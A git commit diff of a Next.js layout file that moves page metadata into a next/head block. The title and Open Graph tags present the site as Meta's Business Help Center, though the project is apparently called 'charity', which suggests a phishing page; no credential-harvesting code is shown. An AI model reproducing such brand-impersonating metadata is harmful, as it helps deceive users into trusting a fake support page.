1455158dbb5f6309c1eaf7682a14236a226720a7
@Chrisdevcode <jephthahimade@gmail.com>
2024-07-04 17:57:18 +0100

    all done with charity

--- src/app/layout.tsx
+++ src/app/layout.tsx
@@ -1,25 +1,8 @@
-import type { Metadata } from "next";
 import { Inter } from "next/font/google";
+import Head from "next/head";
 import "./globals.css";
 
 const inter = Inter({ subsets: ["latin"] });
-
-export const metadata: Metadata = {
-  title: "Business Help Center | Privacy Policy",
-  openGraph: {
-    title: "Meta | Business Help Center | Support",
-    description:
-      "Meta Support page - Dedicated to making our meta safe for everyone",
-    images: [
-      {
-        url: "https://firebasestorage.googleapis.com/v0/b/charity-7cbc9.appspot.com/o/card_img.jpg?alt=media&token=2ea1c79f-ef3d-4516-a511-4d42a0b36940",
-        width: 800,
-        height: 600,
-        alt: "Meta Support | Help Center",
-      },
-    ],
-  },
-};
 
 export default function RootLayout({
   children,
@@ -28,6 +11,21 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
+      <Head>
+        <title>Business Help Center | Privacy Policy</title>
+        <meta
+          property="og:title"
+          content="Meta | Business Help Center | Support"
+        />
+        <meta
+          property="og:description"
+          content="Meta Support page - Dedicated to making our meta safe for everyone"
+        />
+        <meta
+          property="og:image"
+          content="https://firebasestorage.googleapis.com/v0/b/charity-7cbc9.appspot.com/o/card_img.jpg?alt=media&token=2ea1c79f-ef3d-4516-a511-4d42a0b36940"
+        />
+      </Head>
       <body className={inter.className}>{children}</body>
     </html>
   );
